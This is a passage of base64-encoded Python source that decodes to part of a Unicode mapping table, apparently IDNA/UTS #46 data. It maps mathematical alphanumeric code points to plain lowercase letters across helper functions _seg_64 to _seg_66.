4MUQ0RkUsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ0RkYsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ1MDAsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ1MDEsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ1MDIsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ1MDMsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ1MDQsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ1MDUsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ1MDYsIFwnWFwnKSxcbiAgICAoMHgxRDUwNywgXCdNXCcsIFwnZFwnKSxcbiAgICAoMHgxRDUwOCwgXCdNXCcsIFwnZVwnKSxcbiAgICAoMHgxRDUwOSwgXCdNXCcsIFwnZlwnKSxcbiAgICAoMHgxRDUwQSwgXCdNXCcsIFwnZ1wnKSxcbiAgICAoMHgxRDUwQiwgXCdYXCcpLFxuICAgICgweDFENTBELCBcJ01cJywgXCdqXCcpLFxuICAgICgweDFENTBFLCBcJ01cJywgXCdrXCcpLFxuICAgICgweDFENTBGLCBcJ01cJywgXCdsXCcpLFxuICAgICgweDFENTEwLCBcJ01cJywgXCdtXCcpLFxuICAgICgweDFENTExLCBcJ01cJywgXCduXCcpLFxuICAgICgweDFENTEyLCBcJ01cJywgXCdvXCcpLFxuICAgICgweDFENTEzLCBcJ01cJywgXCdwXCcpLFxuICAgICgweDFENTE0LCBcJ01cJywgXCdxXCcpLFxuICAgICgweDFENTE1LCBcJ1hcJyksXG4gICAgKDB4MUQ1MTYsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ1MTcsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ1MTgsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ1MTksIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ1MUEsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ1MUIsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ1MUMsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ1MUQsIFwnWFwnKSxcbiAgICAoMHgxRDUxRSwgXCdNXCcsIFwnYVwnKSxcbiAgICAoMHgxRDUxRiwgXCdNXCcsIFwnYlwnKSxcbiAgICAoMHgxRDUyMCwgXCdNXCcsIFwnY1wnKSxcbiAgICAoMHgxRDUyMSwgXCdNXCcsIFwnZFwnKSxcbiAgICAoMHgxRDUyMiwgXCdNXCcsIFwnZVwnKSxcbiAgICAoMHgxRDUyMywgXCdNXCcsIFwnZlwnKSxcbiAgICAoMHgxRDUyNCwgXCdNXCcsIFwnZ1wnKSxcbiAgICAoMHgxRDUyNSwgXCdNXCcsIFwnaFwnKSxcbiAgICAoMHgxRDUyNiwgXCdNXCcsIFwnaVwnKSxcbiAgICAoMHgxRDUyNywgXCdNXCcsIFwnalwnKSxcbiAgICAoMHgxRDUyOCwgXCdNXCcsIFwna1wnKSxcbiAgICAoMHgxRDUyOSwgXCdNXCcsIFwnbFwnKSxcbiAgICAoMHgxRDUyQSwgXCdNXCcsIFwnbVwnKSxcbiAgICAoMHgxRDUyQiwgXCdNXCcsIFwnblwnKSxcbiAgICAoMHgxRDUyQywgXCdNXCcsIFwnb1wnKSxcbiAgICAoMHgxRDUyRCwgXCdNXCcsIFwncFwnKSxcbiAgICAoMHgxRDUyRSwgXCdNXCcsIFwncVwnKSxcbiAgICAoMHgxRDUyRiwgXCdNXCcsIFwnclwnKSxcbiAgICAoMHgxRDUzMCwgXCdNXCcsIFwnc1wnKSxcbiAgICAoMHgxRDUzMSwgXCdNXCcsIFwndFwnKSxcbiAgICAoMHgxRDUzMiwgXCdNXCcsIFwndVwnKSxcbiAgICAoMHgxRDUzMywgXCdNXCcsIFwndlwnKSxcbiAgICAoMHgxRDUzNCwgXCdNXCcsIFwnd1wnKSxcbiAgICAoMHgxRDUzNSwgXCdNXCcsIFwneFwnKSxcbiAgICAoMHgxRDUzNiwgXCdNXCcsIFwneVwnKSxcbiAgICAoMHgxRDUzNywgXCdNXCcsIFwnelwnKSxcbiAgICAoMHgxRDUzOCwgXCdNXCcsIFwnYVwnKSxcbiAgICAoMHgxRDUzOSwgXCdNXCcsIFwnYlwnKSxcbiAgICAoMHgxRDUzQSwgXCdYXCcpLFxuICAgICgweDFENTNCLCBcJ01cJywgXCdkXCcpLFxuICAgICgweDFENTNDLCBcJ01cJywgXCdlXCcpLFxuICAgICgweDFENTNELCBcJ01cJywgXCdmXCcpLFxuICAgICgweDFENTNFLCBcJ01cJywgXCdnXCcpLFxuICAgICgweDFENTNGLCBcJ1hcJyksXG4gICAgKDB4MUQ1NDAsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ1NDEsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ1NDIsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ1NDMsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ1NDQsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ1NDUsIFwnWFwnKSxcbiAgICAoMHgxRDU0NiwgXCdNXCcsIFwnb1wnKSxcbiAgICAoMHgxRDU0NywgXCdYXCcpLFxuICAgICgweDFENTRBLCBcJ01cJywgXCdzXCcpLFxuICAgICgweDFENTRCLCBcJ01cJywgXCd0XCcpLFxuICAgICgweDFENTRDLCBcJ01cJywgXCd1XCcpLFxuICAgICgweDFENTRELCBcJ01cJywgXCd2XCcpLFxuICAgICgweDFENTRFLCBcJ01cJywgXCd3XCcpLFxuICAgICgweDFENTRGLCBcJ01cJywgXCd4XCcpLFxuICAgICgweDFENTUwLCBcJ01cJywgXCd5XCcpLFxuICAgICgweDFENTUxLCBcJ1hcJyksXG4gICAgKDB4MUQ1NTIsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ1NTMsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ1NTQsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ1NTUsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ1NTYsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ1NTcsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ1NTgsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ1NTksIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ1NUEsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ1NUIsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ1NUMsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ1NUQsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ1NUUsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ1NUYsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ1NjAsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ1NjEsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ1NjIsIFwnTVwnLCBcJ3FcJyksXG4gICAgXVxuXG5kZWYgX3NlZ182NCgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4MUQ1NjMsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ1NjQsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ1NjUsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ1NjYsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ1NjcsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ1NjgsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ1NjksIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ1NkEsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ1NkIsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ1NkMsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ1NkQsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ1NkUsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ1NkYsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ1NzAsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ1NzEsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ1NzIsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ1NzMsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ1NzQsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ1NzUsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ1NzYsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ1NzcsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ1NzgsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ1NzksIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ1N0EsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ1N0IsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ1N0MsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MUQ1N0QsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ1N0UsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ1N0YsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ1ODAsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ1ODEsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ1ODIsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ1ODMsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ1ODQsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ1ODUsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ1ODYsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ1ODcsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ1ODgsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ1ODksIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ1OEEsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ1OEIsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ1OEMsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ1OEQsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ1OEUsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ1OEYsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ1OTAsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ1OTEsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ1OTIsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ1OTMsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ1OTQsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ1OTUsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ1OTYsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MUQ1OTcsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ1OTgsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ1OTksIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ1OUEsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ1OUIsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ1OUMsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ1OUQsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ1OUUsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ1OUYsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ1QTAsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ1QTEsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ1QTIsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ1QTMsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ1QTQsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ1QTUsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ1QTYsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ1QTcsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ1QTgsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ1QTksIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ1QUEsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ1QUIsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ1QUMsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ1QUQsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ1QUUsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ1QUYsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ1QjAsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MUQ1QjEsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ1QjIsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ1QjMsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ1QjQsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ1QjUsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ1QjYsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ1QjcsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ1QjgsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ1QjksIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ1QkEsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ1QkIsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ1QkMsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ1QkQsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ1QkUsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ1QkYsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ1QzAsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ1QzEsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ1QzIsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ1QzMsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ1QzQsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ1QzUsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ1QzYsIFwnTVwnLCBcJ21cJyksXG4gICAgXVxuXG5kZWYgX3NlZ182NSgpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4MUQ1QzcsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ1QzgsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ1QzksIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ1Q0EsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MUQ1Q0IsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ1Q0MsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ1Q0QsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ1Q0UsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ1Q0YsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ1RDAsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ1RDEsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ1RDIsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ1RDMsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ1RDQsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ1RDUsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ1RDYsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ1RDcsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ1RDgsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ1RDksIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ1REEsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ1REIsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ1REMsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ1REQsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ1REUsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ1REYsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ1RTAsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ1RTEsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ1RTIsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ1RTMsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ1RTQsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MUQ1RTUsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ1RTYsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ1RTcsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ1RTgsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ1RTksIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ1RUEsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ1RUIsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ1RUMsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ1RUQsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ1RUUsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ1RUYsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ1RjAsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ1RjEsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ1RjIsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ1RjMsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ1RjQsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ1RjUsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ1RjYsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ1RjcsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ1RjgsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ1RjksIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ1RkEsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ1RkIsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ1RkMsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ1RkQsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ1RkUsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MUQ1RkYsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ2MDAsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ2MDEsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ2MDIsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ2MDMsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ2MDQsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ2MDUsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ2MDYsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ2MDcsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ2MDgsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ2MDksIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ2MEEsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ2MEIsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ2MEMsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ2MEQsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ2MEUsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ2MEYsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ2MTAsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ2MTEsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ2MTIsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ2MTMsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ2MTQsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ2MTUsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ2MTYsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ2MTcsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ2MTgsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MUQ2MTksIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ2MUEsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ2MUIsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ2MUMsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ2MUQsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ2MUUsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ2MUYsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ2MjAsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ2MjEsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ2MjIsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ2MjMsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ2MjQsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ2MjUsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ2MjYsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ2MjcsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ2MjgsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ2MjksIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ2MkEsIFwnTVwnLCBcJ2lcJyksXG4gICAgXVxuXG5kZWYgX3NlZ182NigpIC0+IExpc3RbVW5pb25bVHVwbGVbaW50LCBzdHJdLCBUdXBsZVtpbnQsIHN0ciwgc3RyXV1dOlxuICAgIHJldHVybiBbXG4gICAgKDB4MUQ2MkIsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ2MkMsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ2MkQsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ2MkUsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ2MkYsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ2MzAsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ2MzEsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ2MzIsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MUQ2MzMsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ2MzQsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ2MzUsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ2MzYsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ2MzcsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ2MzgsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ2MzksIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ2M0EsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ2M0IsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ2M0MsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ2M0QsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ2M0UsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ2M0YsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ2NDAsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ2NDEsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ2NDIsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ2NDMsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ2NDQsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ2NDUsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ2NDYsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ2NDcsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ2NDgsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ2NDksIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ2NEEsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ2NEIsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ2NEMsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MUQ2NEQsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ2NEUsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ2NEYsIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ2NTAsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ2NTEsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ2NTIsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ2NTMsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ2NTQsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ2NTUsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ2NTYsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ2NTcsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ2NTgsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ2NTksIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ2NUEsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ2NUIsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ2NUMsIFwnTVwnLCBcJ2dcJyksXG4gICAgKDB4MUQ2NUQsIFwnTVwnLCBcJ2hcJyksXG4gICAgKDB4MUQ2NUUsIFwnTVwnLCBcJ2lcJyksXG4gICAgKDB4MUQ2NUYsIFwnTVwnLCBcJ2pcJyksXG4gICAgKDB4MUQ2NjAsIFwnTVwnLCBcJ2tcJyksXG4gICAgKDB4MUQ2NjEsIFwnTVwnLCBcJ2xcJyksXG4gICAgKDB4MUQ2NjIsIFwnTVwnLCBcJ21cJyksXG4gICAgKDB4MUQ2NjMsIFwnTVwnLCBcJ25cJyksXG4gICAgKDB4MUQ2NjQsIFwnTVwnLCBcJ29cJyksXG4gICAgKDB4MUQ2NjUsIFwnTVwnLCBcJ3BcJyksXG4gICAgKDB4MUQ2NjYsIFwnTVwnLCBcJ3FcJyksXG4gICAgKDB4MUQ2NjcsIFwnTVwnLCBcJ3JcJyksXG4gICAgKDB4MUQ2NjgsIFwnTVwnLCBcJ3NcJyksXG4gICAgKDB4MUQ2NjksIFwnTVwnLCBcJ3RcJyksXG4gICAgKDB4MUQ2NkEsIFwnTVwnLCBcJ3VcJyksXG4gICAgKDB4MUQ2NkIsIFwnTVwnLCBcJ3ZcJyksXG4gICAgKDB4MUQ2NkMsIFwnTVwnLCBcJ3dcJyksXG4gICAgKDB4MUQ2NkQsIFwnTVwnLCBcJ3hcJyksXG4gICAgKDB4MUQ2NkUsIFwnTVwnLCBcJ3lcJyksXG4gICAgKDB4MUQ2NkYsIFwnTVwnLCBcJ3pcJyksXG4gICAgKDB4MUQ2NzAsIFwnTVwnLCBcJ2FcJyksXG4gICAgKDB4MUQ2NzEsIFwnTVwnLCBcJ2JcJyksXG4gICAgKDB4MUQ2NzIsIFwnTVwnLCBcJ2NcJyksXG4gICAgKDB4MUQ2NzMsIFwnTVwnLCBcJ2RcJyksXG4gICAgKDB4MUQ2NzQsIFwnTVwnLCBcJ2VcJyksXG4gICAgKDB4MUQ2NzUsIFwnTVwnLCBcJ2ZcJyksXG4gICAgKDB4MUQ2NzYs